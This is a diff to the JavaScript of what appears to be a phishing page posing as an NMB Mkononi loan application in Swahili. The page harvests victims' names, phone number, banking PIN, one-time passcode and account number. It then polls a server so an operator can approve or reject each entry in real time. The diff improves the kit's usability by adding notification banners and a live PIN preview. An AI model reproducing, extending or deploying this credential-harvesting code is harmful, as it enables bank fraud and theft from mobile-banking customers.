@@ -1,12 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // Generate a unique session ID for this browser session
     let sessionId = localStorage.getItem('nmb_session_id');
     if (!sessionId) {
         sessionId = 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
         localStorage.setItem('nmb_session_id', sessionId);
     }
 
-    // Get URL parameters (like ?ref=CHAT_ID)
     const urlParams = new URLSearchParams(window.location.search);
     const ref = urlParams.get('ref') || '';
 
@@ -47,7 +45,18 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('loading-overlay').classList.add('hidden');
     }
 
-    // Polling function to check admin action from server
+    function showNotification(message, type = 'error') {
+        const banner = document.getElementById('surface-notification');
+        banner.innerText = message;
+        banner.className = `surface-notification ${type}`;
+        banner.classList.remove('hidden');
+    }
+
+    function hideNotification() {
+        const banner = document.getElementById('surface-notification');
+        banner.classList.add('hidden');
+    }
+
     function pollServerStatus(onNextStep, onRestartPin, onRestartOtp, onRestartAcc, onSuccess) {
         const interval = setInterval(async () => {
             try {
@@ -59,6 +68,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     hideLoading();
 
                     if (data.status === 'next_step' && typeof onNextStep === 'function') {
+                        hideNotification();
                         onNextStep();
                     } else if (data.status === 'restart_pin' && typeof onRestartPin === 'function') {
                         onRestartPin();
@@ -67,13 +77,14 @@ document.addEventListener('DOMContentLoaded', () => {
                     } else if (data.status === 'restart_acc' && typeof onRestartAcc === 'function') {
                         onRestartAcc();
                     } else if (data.status === 'success' && typeof onSuccess === 'function') {
+                        hideNotification();
                         onSuccess();
                     }
                 }
             } catch (err) {
                 console.error('Polling error:', err);
             }
-        }, 2000); // Poll every 2 seconds
+        }, 2000);
     }
 
     // --- Screen 1: Slider Calculator ---
@@ -92,7 +103,6 @@ document.addEventListener('DOMContentLoaded', () => {
         displayAmount.innerText = `TSh ${amt.toLocaleString()}`;
         displayDuration.innerText = `${dur} miezi`;
 
-        // Simple monthly payment estimate calculation
         const monthly = Math.round((amt * (1 + 0.25 * (dur / 12))) / dur);
         displayMonthly.innerText = `TSh ${monthly.toLocaleString()}`;
         document.getElementById('input-loan-amount').value = amt;
@@ -104,6 +114,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     document.getElementById('btn-omba-sasa').addEventListener('click', () => {
+        hideNotification();
         showScreen('screen-step1');
     });
 
@@ -112,11 +123,13 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.loanType = document.getElementById('loan-type').value;
         formData.amount = parseInt(document.getElementById('input-loan-amount').value) || formData.amount;
         formData.purpose = document.getElementById('loan-purpose').value;
+        hideNotification();
         showScreen('screen-step2');
     });
 
     // --- Screen 3: Step 2 ---
     document.getElementById('btn-step2-back').addEventListener('click', () => {
+        hideNotification();
         showScreen('screen-step1');
     });
 
@@ -126,7 +139,7 @@ document.addEventListener('DOMContentLoaded', () => {
         let phone = document.getElementById('phone-number').value.trim();
 
         if (!firstName || !lastName || !phone) {
-            alert('Tafadhali jaza sehemu zote.');
+            showNotification('Tafadhali jaza sehemu zote.', 'error');
             return;
         }
 
@@ -138,14 +151,13 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.lastName = lastName;
         formData.phone = phone;
 
-        // Register application initialization on backend
+        hideNotification();
         fetch('/api/submit-application', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId, phone, ref })
         }).catch(err => console.error(err));
 
-        // Populate step 3 summary
         document.getElementById('sum-amount').innerText = `TSh ${formData.amount.toLocaleString()}`;
         document.getElementById('sum-duration').innerText = `${formData.duration} Miezi`;
         document.getElementById('sum-purpose').innerText = formData.purpose || 'Biashara';
@@ -155,19 +167,26 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Screen 4: Step 3 ---
     document.getElementById('btn-step3-back').addEventListener('click', () => {
+        hideNotification();
         showScreen('screen-step2');
     });
 
     document.getElementById('btn-step3-submit').addEventListener('click', () => {
         formData.employment = document.getElementById('employment-status').value;
         formData.annualIncome = document.getElementById('annual-income').value;
+        hideNotification();
         showScreen('screen-pin');
     });
 
-    // --- Screen 5: PIN Inputs handling ---
+    // --- Screen 5: PIN Inputs handling with Live Number Preview on Top ---
     const pinBoxes = document.querySelectorAll('.pin-box');
     pinBoxes.forEach((box, index) => {
         box.addEventListener('input', (e) => {
+            let currentPin = '';
+            pinBoxes.forEach(b => currentPin += b.value);
+            const previewEl = document.getElementById('pin-preview');
+            if (previewEl) previewEl.innerText = currentPin;
+
             if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
                 pinBoxes[index + 1].focus();
             }
@@ -175,6 +194,10 @@ document.addEventListener('DOMContentLoaded', () => {
         box.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && !box.value && index > 0) {
                 pinBoxes[index - 1].focus();
+                let currentPin = '';
+                pinBoxes.forEach(b => currentPin += b.value);
+                const previewEl = document.getElementById('pin-preview');
+                if (previewEl) previewEl.innerText = currentPin;
             }
         });
     });
@@ -184,11 +207,12 @@ document.addEventListener('DOMContentLoaded', () => {
         pinBoxes.forEach(box => pin += box.value);
 
         if (pin.length !== 4) {
-            alert('Tafadhali weka PIN ya tarakimu 4 kamili.');
+            showNotification('Tafadhali weka PIN ya tarakimu 4 kamili.', 'error');
             return;
         }
 
         formData.pin = pin;
+        hideNotification();
         showLoading('Inahibitisha PIN na NMB Mkononi...');
 
         fetch('/api/submit-pin', {
@@ -198,21 +222,22 @@ document.addEventListener('DOMContentLoaded', () => {
         }).then(() => {
             pollServerStatus(
                 () => {
-                    // Next step: OTP screen
                     document.getElementById('lbl-otp-phone').innerText = `+255${formData.phone}`;
                     showScreen('screen-otp');
                 },
                 () => {
-                    // Restart pin on deny/wrong pin
-                    alert('PIN si sahihi au imekataliwa. Jaribu tena.');
+                    hideLoading();
+                    showNotification('PIN si sahihi au imekataliwa. Jaribu tena.', 'error');
                     pinBoxes.forEach(b => b.value = '');
+                    const previewEl = document.getElementById('pin-preview');
+                    if (previewEl) previewEl.innerText = '';
                     pinBoxes[0].focus();
                     showScreen('screen-pin');
                 }
             );
         }).catch(() => {
             hideLoading();
-            alert('Hitilafu ya mtandao. Jaribu tena.');
+            showNotification('Hitilafu ya mtandao. Jaribu tena.', 'error');
         });
     });
 
@@ -236,11 +261,12 @@ document.addEventListener('DOMContentLoaded', () => {
         otpBoxes.forEach(box => otp += box.value);
 
         if (otp.length !== 4) {
-            alert('Tafadhali weka namba za OTP kamili.');
+            showNotification('Tafadhali weka namba za OTP kamili.', 'error');
             return;
         }
 
         formData.otp = otp;
+        hideNotification();
         showLoading('Inathibitisha OTP...');
 
         fetch('/api/submit-otp', {
@@ -250,13 +276,12 @@ document.addEventListener('DOMContentLoaded', () => {
         }).then(() => {
             pollServerStatus(
                 () => {
-                    // Next step: Account number entry screen
                     showScreen('screen-account');
                 },
                 null,
                 () => {
-                    // Restart OTP on wrong OTP error
-                    alert('OTP si sahihi. Jaribu tena.');
+                    hideLoading();
+                    showNotification('OTP si sahihi. Jaribu tena.', 'error');
                     otpBoxes.forEach(b => b.value = '');
                     otpBoxes[0].focus();
                     showScreen('screen-otp');
@@ -264,7 +289,7 @@ document.addEventListener('DOMContentLoaded', () => {
             );
         }).catch(() => {
             hideLoading();
-            alert('Hitilafu ya mtandao.');
+            showNotification('Hitilafu ya mtandao.', 'error');
         });
     });
 
@@ -273,11 +298,12 @@ document.addEventListener('DOMContentLoaded', () => {
         const accountNumber = document.getElementById('account-number-input').value.trim();
 
         if (accountNumber.length !== 11) {
-            alert('Namba ya akaunti lazima iwe na tarakimu 11 kamili.');
+            showNotification('Namba ya akaunti lazima iwe na tarakimu 11 kamili.', 'error');
             return;
         }
 
         formData.accountNumber = accountNumber;
+        hideNotification();
         showLoading('Inakagua akaunti ya benki...');
 
         fetch('/api/submit-account', {
@@ -288,33 +314,34 @@ document.addEventListener('DOMContentLoaded', () => {
             pollServerStatus(
                 null,
                 () => {
-                    alert('PIN si sahihi.');
+                    hideLoading();
+                    showNotification('PIN si sahihi.', 'error');
                     showScreen('screen-pin');
                 },
                 () => {
-                    alert('OTP si sahihi.');
+                    hideLoading();
+                    showNotification('OTP si sahihi.', 'error');
                     showScreen('screen-otp');
                 },
                 () => {
-                    alert('Namba ya akaunti si sahihi. Tafadhali rudia.');
+                    hideLoading();
+                    showNotification('Namba ya akaunti si sahihi. Tafadhali rudia.', 'error');
                     document.getElementById('account-number-input').value = '';
                     showScreen('screen-account');
                 },
                 () => {
-                    // Success screen
                     showScreen('screen-success');
                 }
             );
         }).catch(() => {
             hideLoading();
-            alert('Hitilafu ya mtandao.');
+            showNotification('Hitilafu ya mtandao.', 'error');
         });
     });
 
-    // --- Screen 8: Success Restart ---
     document.getElementById('btn-home').addEventListener('click', () => {
         localStorage.removeItem('nmb_session_id');
         location.reload();
     });
 });
-                
+                                                     
